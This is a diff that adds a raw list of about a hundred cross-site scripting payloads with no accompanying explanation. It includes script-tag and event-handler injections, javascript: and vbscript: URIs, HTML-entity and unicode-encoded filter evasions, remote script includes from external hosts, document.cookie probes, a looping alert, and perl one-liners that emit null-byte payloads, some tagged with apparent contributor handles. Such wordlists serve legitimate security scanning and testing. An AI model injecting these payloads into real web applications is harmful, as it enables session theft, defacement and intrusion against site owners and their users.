@@ -1,0 +1,114 @@
+'';!--"<XSS>=&{()}
+><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT SRC=http://www.ngssoftware.com/xss.js></SCRIPT>
+<h1>alert<h1>
+<IMG SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http://www.ngssoftware.com/xss.js></SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("Jerry says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://www.ngssoftware.com/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://www.ngssoftware.com/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://www.ngssoftware.com/xss.js?<B>
+<SCRIPT SRC=//www.ngssoftware.com/.j>
+<iframe src=http://www.ngssoftware.com/scriptlet.html <
+<script>alert('ngs')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.cookie);</script>
+<script>alert("XSS")</script>
+<script     >alert(document.cookie)</script    >
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script/*aaaaaa*/>/*aaaaa*/alert(String.fromCharCode(88,83,83))/*aaaaa*/</script/*aaaaa*/>
+<script/**/>/**/alert(String.fromCharCode(/**/88,/**/83,/**/83))/**/</script/*aaaaa*/>
+<script/**/>/**/alert('/**/XSS/**/')/**/</script/*aaaaa*/>
+<script/**/>/**/alert("/**/XSS/**/")/**/</script/*aaaaa*/>
+<script type="text/JavaScript">alert(document.cookie)</script>
+<script language="JavaScript" type="text/JavaScript">alert(document.cookie)</script>
+<script language="JavaScript" type="text/JavaScript">alert(document.cookie)</script>
+<script language="JaVaScRiPt" type="text/JavaScript">alert(document.cookie)</script>
+<script language="JaVaScRiPt">alert(document.cookie)</script>
+<script language="JavaScript">alert(document.cookie)</script>
+<a href="javascript:document.location='http://www.ngssoftware.com/'">XSS</a>
+�script�alert(�XSS�)�/script�
+<script>a=/XSS/
+alert(a.source)</script>
+<script/**/      >a=/XSS/
+alert(a.source)</script/**/   >
+%A7%A2%BE%BC%F3%E3%F2%E9%F0%F4%BE%E1%EC%E5%F2%F4%A8430638%A9%BC%AF%F3%E3%F2%E9%F0%F4%BE
+<script>eval(unescape("\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029"))</script>
+<script>eval(unescape('\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029'))</script>
+<script>eval(unescape('\u0061\u006C\u0065\u0072\u0074\u0028\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0063\u006F\u006F\u006B\u0069\u0065\u0029'))</script>
+<A HREF=www.ngssoftware.com onmouseover=alert('NGSTEST')>mylink</a>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
+<IMG SRC="test" onerror=alert('NGSTEST') />
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(String.fromCharCode(88,83,83))>
+<SCRIPT SRC=http://www.ngssoftware.com/xss.js?<B>
+<A onmouseover=document.write('XSS') >Click me</A>
+<A onmouseover=document.write(String.fromCharCode(88,83,83)) >Click me</A>
+<A onmouseover=alert('XSS') >Click me</A>
+onLoad()
+<A onmouseover=alert(String.fromCharCode(88,83,83)) >Click me</A>
+"onerror="alert(String.fromCharCode(88,83,90))
+<img src='' onerror=alert()>
+</<img src='' onerror=alert()>
+'>"><script src =
+'http://www.site.com/XSS.js'></script> 	systemcrash
+'></select><script>alert(123)</script> 	Uber0n
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> 	fallingmidget
+<html><noalert><noscript>(123)</noscript><script>(123)</s
+cript> 	Zeryus
+</script></script><<<<script><>>>><<<sc
+ript>alert(123)</script> 	Zeryus
+'""><script language="JavaScript"> alert('X \nS
+\nS');</script> 	xylitol
+</textarea>'"><script>alert(document.cookie)</script> 	depo2
+'"></title><script>alert(1111)</script> 	xylitol
+<body onLoad="while(true) alert('XSS');"> 	xylitol
+"></iframe><script>alert(123)</script> 	Uber0n
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))< 	code
+<BASE HREF="javascript:alert('XSS');//"> 	code
+[color=red width=expression(alert(123))][color] 	fallingmidget
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> 	Mutant
+</script><script>alert(1)</script> 	xylitol
+</br style=a:expression(alert())> 	goreland
+<scrscriptipt>alert(1)</scrscriptipt> 	Raster
+<br size=\"&{alert('XSS')}\"> 	code
+perl -e 'print \"<IMG
+SRC=java\0script:alert(\"XSS\")>\";' > out 	code
+perl -e 'print
+\"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out 	code
+<STYLE>li {list-style-image:
+url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XS
+S 	code
+<FRAMESET><FRAME
+SRC=\"javascript:alert('XSS');\"></FRAMESET> 	code
+" onfocus=alert(document.domain) "> <" 	tweetycoaster
+<IMG SRC='vbscript:msgbox(\"XSS\")'> 	code
+<?='<SCRIPT>alert("XSS")</SCRIPT>'?> 	tweetycoaster
+<STYLE
+type="text/css">BODY{background:url("javascript:alert('XSS')&q
+uot;)}</STYLE> 	tweetycoaster
+<script>var var = 1; alert(var)</script> 	xylitol
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;
+URL=http://;URL=javascript:alert('XSS');\"> 	code
+<META HTTP-EQUIV=\"refresh\"
+CONTENT=\"0;url=javascript:alert('XSS');\"> 	code
+'">><marquee><h1>NGSTEST</h1></marquee>
+'">><marquee><script>alert(1)</script></marquee>
+'">><marquee><script>alert(document.cookie)</script></marquee>
+'">><marquee>onStart=alert(document.cookie)</marquee>
